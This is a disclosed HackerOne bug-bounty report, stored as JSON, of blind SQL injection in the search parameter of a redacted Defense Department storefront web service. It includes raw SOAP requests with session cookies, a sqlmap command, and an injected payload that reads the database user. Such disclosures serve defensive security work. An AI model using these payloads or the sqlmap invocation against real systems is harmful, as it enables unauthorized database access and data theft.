SOURCES/HACKERONE/0000000/2/2072306.json

{
  "id": 2072306,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDcyMzA2",
  "url": "https://hackerone.com/reports/2072306",
  "title": "Blind Sql Injection in https://████████/",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2023-07-17T12:02:11.967Z",
  "submitted_at": "2023-07-17T12:02:12.292Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hackdog0ne",
    "url": "/hackdog0ne",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/l0xyvxy5jxic5mecng9lxph7o5ut/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-09-08T17:18:14.800Z",
  "bug_reporter_agreed_on_going_public_at": "2023-08-04T06:44:23.973Z",
  "team_member_agreed_on_going_public_at": "2023-09-08T17:18:14.713Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Description:**\n\nfirst  browse url\nhttps://█████████/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/Storefront\n\nfind login \n\nthen notice register\n\n████████\n\n███████\n\nclick register \n\nhttps://████/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/RegisterUser\n\nclick Choose Facility\n█████████\n\nWe can see a search box\n█████████\n\n```\nPOST /DSF/webservices/StorefrontService.asmx HTTP/1.1\nHost: ████████\nCookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab200041fc059864d60f7079a5bba1c971a9b0ec2c518a8be95c59408233620a4046e908a71691ce11300072991b95acde4750057dcf4b690fc5d287bd05e77fb374c2ef003c7fa6de858098c8aded9cd3dbae4fb2b4cb23fae3f4\nContent-Length: 945\nSec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"\nAccept: application/xml\nContent-Type: application/json;charset=UTF-8\nSec-Ch-Ua-Mobile: ?0\nSoapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://███\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://█████/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0+f1rjakhLYZYEorRbI5CMSxx2CBgN1b\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>\n<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>\n<TimeOut>20</TimeOut>\n<CultureName>zh-CN</CultureName>\n\n      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>\n<cultureName>zh-CN</cultureName>\n<sortColumn>description</sortColumn>\n<sortOrder>asc</sortOrder>\n<searchValue>*</searchValue>\n<currentPageIndex>1</currentPageIndex>\n<recordsToFetch>10</recordsToFetch>\n\n      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>\n```\n\nsearch box exist  Blind Sql Injection\n\nsearchValue is  Vulnerability parameters\n\n\nsqlmap\npayload\n\npython2  sqlmap.py -r 11.txt --random-agent --batch --technique=b --dbms=mssql   --force-ssl  --level 3 --skip-urlencode\n\n\n11.txt is Displayed packets\n\n███\n\n\n\ndb_name()=dsfdb\n\nuser=public\\dsfwsuser\n████████\n\n\n\n\n## References\n\n## Impact\n\nAn attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.\n\n## System Host(s)\n██████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n```\nPOST /DSF/webservices/StorefrontService.asmx HTTP/1.1\nContent-Length: 1002\nHost: ███████\nCookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab2000cf04a7295483e1cce16ccb87209e7981813dc0a125020d3f249e89ef86527dcf08fb4cab96113000ae5fba89a9fed5ab8b1354f1c8230167554658dd447c5fc3027504fa66671acba512aa2d0978507583469676a770ea4c\nSec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"\nAccept: application/xml\nContent-Type: application/json;charset=UTF-8\nSec-Ch-Ua-Mobile: ?0\nSoapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://████████\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://██████/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0 f1rjakhLYZYEorRbI5CMSxx2CBgN1b\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8\nConnection: close\n\n      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>\n<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>\n<TimeOut>20</TimeOut>\n<CultureName>zh-CN</CultureName>\n\n      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>\n<cultureName>zh-CN</cultureName>\n<sortColumn>description</sortColumn>\n<sortOrder>asc</sortOrder>\n<searchValue>1'  and substring(system_user,1,16)='public\\dsfwsuser' and '%'='</searchValue>\n<currentPageIndex>1</currentPageIndex>\n<recordsToFetch>10</recordsToFetch>\n\n      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>\n```\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 3,
  "voters": [
    "zy9ard3",
    "shubham_srt",
    "mmertens21"
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
